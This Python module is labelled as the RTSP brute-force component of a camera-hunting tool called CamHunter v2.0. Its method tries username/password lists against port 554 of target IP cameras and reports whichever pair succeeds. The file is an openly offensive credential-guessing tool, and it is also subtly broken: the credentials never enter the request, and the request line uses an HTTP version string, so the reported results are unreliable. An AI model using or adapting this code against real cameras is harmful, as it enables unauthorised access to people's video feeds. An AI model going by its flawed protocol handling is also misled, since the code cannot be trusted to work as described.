"""
RTSP Brute Force Module for CamHunter v2.0
"""

import socket
import logging
from typing import List, Optional

logger = logging.getLogger("camhunter.brute.rtsp")

class RTSPBrute:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.timeout = cfg["brute"]["timeout"]

    def attack(self, ip: str, credentials: List[tuple]) -> Optional[dict]:
        """
        Simplified RTSP brute-force via socket probe.
        """
        port = 554
        for user, pw in credentials:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((ip, port))
                
                # Simple RTSP DESCRIBE request with auth
                # (Note: This is a simplified version, real RTSP auth is more complex)
                msg = f"DESCRIBE rtsp://{ip}:{port}/ HTTP/1.0\r\nCSeq: 1\r\n\r\n"
                s.send(msg.encode())
                data = s.recv(1024).decode(errors='ignore')
                
                if "200 OK" in data:
                    s.close()
                    return {"username": user, "password": pw, "port": port}
                s.close()
            except Exception:
                continue
        return None
